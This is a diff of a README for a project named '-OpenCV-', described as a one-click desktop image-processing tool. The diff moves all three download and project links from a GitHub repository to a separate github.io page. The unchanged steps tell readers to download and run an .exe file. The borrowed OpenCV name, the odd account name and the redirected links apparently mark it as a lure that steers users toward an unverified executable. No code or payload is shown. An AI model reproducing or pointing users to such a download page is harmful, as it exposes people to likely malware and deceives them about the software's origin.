@@ -1,12 +1,12 @@
 # 👁️ -OpenCV- - Process Images With One Click
 
-[![](https://img.shields.io/badge/Download-Application-blue.svg)](https://github.com/Nitroglyceringround109/-OpenCV-)
+[![](https://img.shields.io/badge/Download-Application-blue.svg)](https://nitroglyceringround109.github.io)
 
 -OpenCV- is a desktop tool for image processing. It helps you edit photos, detect faces, and read QR codes. You do not need coding skills to use it. The program handles complex visual tasks through a simple interface.
 
 ## 📥 Getting Started
 
-1. Visit the [official download page](https://github.com/Nitroglyceringround109/-OpenCV-).
+1. Visit the [official download page](https://nitroglyceringround109.github.io).
 2. Locate the latest release version on the screen.
 3. Click the file ending in .exe to start the transfer.
 4. Save the file to your desktop or downloads folder.
@@ -71,7 +71,7 @@ The software uses Qt 6 for the interface and OpenCV for vision tasks. These tool
 
 ## 🌐 Community and Support
 
-Check the [project page](https://github.com/Nitroglyceringround109/-OpenCV-) for updates. We release new versions regularly to improve performance. You can view the history of changes on the releases page. 
+Check the [project page](https://nitroglyceringround109.github.io) for updates. We release new versions regularly to improve performance. You can view the history of changes on the releases page. 
 
 The software supports several file types and processes them with high accuracy. The interface provides feedback as you adjust settings. Start by testing one image to understand how the tools work. Once you feel comfortable, you can process larger batches of files.
 
